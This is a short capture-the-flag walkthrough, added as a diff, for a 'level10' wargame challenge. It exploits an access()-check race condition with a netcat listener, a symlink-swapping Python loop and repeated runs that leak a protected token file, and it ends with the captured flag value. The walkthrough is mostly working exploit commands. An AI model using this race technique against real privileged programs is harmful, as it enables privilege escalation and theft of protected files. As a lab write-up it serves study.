@@ -1,0 +1,47 @@
+🔻 Analyze
+⬇️ ./level10 token http://localhost
+⬇️ ltrace ./level10 token http://localhost
+👉 access("token", 4)
+⬇️ man 2 access
+👉 NOTES 🌟 Warning:  Using  access() ...
+
+
+🔻 Networking
+🌟 https://ru.wikipedia.org/wiki/Netcat
+⬇️ nc -lk 6969 > /tmp/output &
+
+⬇️ curl http://localhost:6969
+⬇️ ctrl+c
+👉 cat /tmp/output
+
+⬇️ echo token_test > /tmp/foo
+⬇️ ./level10 /tmp/foo 127.0.0.1
+👉 cat /tmp/output
+⏹ kill %1
+
+
+🔻 Before hack
+
+echo token_test > /tmp/foo
+ln -sf /tmp/foo /tmp/sym
+ls -la /tmp/sym
+
+ln -sf /home/user/level10/token /tmp/sym
+ls -la /tmp/sym
+
+python_one_line src: https://stackoverflow.com/a/35651859
+python -c $'import os\nimport time\nwhile True:\n\tprint("ok")\n\ttime.sleep(1)\n'
+
+
+🔻 Hack
+rm /tmp/output; nc -lk 6969 > /tmp/output &
+echo token_test > /tmp/foo
+python -c $'import os\nwhile True:\n\tos.system("ln -sf {} {}".format("/tmp/foo", "/tmp/sym"))\n\tos.system("ln -sf {} {}".format("/home/user/level10/token", "/tmp/sym"))' &
+python -c $'import os\nfor _ in range(100):\n\tos.system("./level10 /tmp/sym 127.0.0.1")'
+
+cat /tmp/output
+
+kill %1
+kill %2
+
+woupa2yuojeeaaed06riuj63c
